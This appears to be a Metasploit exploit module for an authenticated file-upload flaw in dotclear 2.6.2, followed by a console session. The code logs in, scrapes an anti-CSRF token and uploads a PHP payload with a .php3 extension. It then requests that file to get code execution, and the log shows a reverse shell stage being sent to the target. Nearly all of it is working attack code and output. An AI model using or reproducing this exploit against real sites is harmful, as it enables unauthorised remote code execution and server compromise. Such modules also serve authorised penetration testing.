# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;dotclear Media Manager Authenticated Arbitrary File Upload&#039;,
      &#039;Description&#039;    => %q{
      The vulnerability exists because of the filemanager::isFileExclude() method not properly verifying the extension of
      which by default is set to “/\.php$/i”. This could be exploited to execute arbitrary PHP code by uploading a file with
      multiple extensions or other extensions (like .php5 or .phtml) which might be handled as PHP scripts. Successful
      exploitation of this vulnerability requires an account with permissions to manage media items.
      },
      &#039;Author&#039;         =>
        [
          &#039;Egidio Romano&#039; #discovery
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2014/May/108&#039;]
        ],
      &#039;Payload&#039;            =>
        {
          &#039;Space&#039; => 10000, # just a big enough number to fit any PHP payload
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;         => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [ &#039;dotclear 2.6.2&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;May 21 2014&#039;))

    register_options([
      OptString.new(&#039;USERNAME&#039;, [true, &#039;The username to authenticate with&#039;, &#039;username&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;The password to authenticate with&#039;, &#039;password&#039;]),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;The full URI path to the instance&#039;, &#039;/&#039;]),
    ], self.class)
  end

  def check
  end

  def exploit
    post = {
      &#039;user_id&#039; => datastore[&#039;USERNAME&#039;],
      &#039;user_pwd&#039; => datastore[&#039;PASSWORD&#039;]
    }

    print_status("Authenticating...")
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;auth.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;vars_post&#039; => post
    })


    if !res or !res.body
      fail_with("Server did not respond in an expected way")
    end

    cookie = res.headers[&#039;Set-Cookie&#039;]

    print_status("Getting xd_check...")
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;media.php?popup=1&#039;),
      &#039;cookie&#039; => cookie
    })

    if !res or !res.body
      fail_with("Server did not respond in an expected way")
    end

    res.body =~ /name="xd_check" value="(.*)"  \/><input type="hidden" name="d"/

    xd_check = $1

    data = Rex::MIME::Message.new
    filename = Rex::Text::rand_text_alpha(8)

    data.add_part(&#039;2097152&#039;, nil, nil, &#039;form-data; name="MAX_FILE_SIZE"&#039;)
    data.add_part(xd_check, nil, nil, &#039;form-data; name="xd_check"&#039;)
    data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="upfiletitle"&#039;)
    data.add_part(&#039;&#039;, nil, nil, &#039;form-data; name="d"&#039;)
    data.add_part(&#039;<?php &#039; + payload.encoded + &#039; ?>&#039;, nil, &#039;text/php&#039;, &#039;form-data; name="upfile[]"; filename="&#039; + filename + &#039;.php3&#039;)

    print_status("Sending payload...")
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;admin&#039;, &#039;media.php?pop_up=1&post_id=&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;cookie&#039; => cookie,
      &#039;data&#039; => data.to_s,
      &#039;ctype&#039; => &#039;multipart/form-data; boundary=&#039; + data.bound
    })

    if !res or !res.body
      fail_with("Server did not respond in an expected way")
    end

    #do something with res

    print_status("Popping shell...")
    send_request_cgi({
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;public&#039;, filename + &#039;.php3&#039;)
    })
  end
end

__END__
msf exploit(dotclear_file_upload) > show options

Module options (exploit/multi/http/dotclear_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   fdsafdsa         yes       The password to authenticate with
   Proxies                     no        Use a proxy chain
   RHOST      192.168.1.114    yes       The target address
   RPORT      80               yes       The target port
   TARGETURI  /dotclear        yes       The full URI path to the instance
   USERNAME   fdsa             yes       The username to authenticate with
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   dotclear 2.6.2


msf exploit(dotclear_file_upload) > exploit

[*] Started reverse handler on 192.168.1.31:4444 
[*] Authenticating...
[*] Getting xd_check...
[*] Sending payload...
[*] Popping shell...
[*] Sending stage (39848 bytes) to 192.168.1.114

Computer    : ubuntu

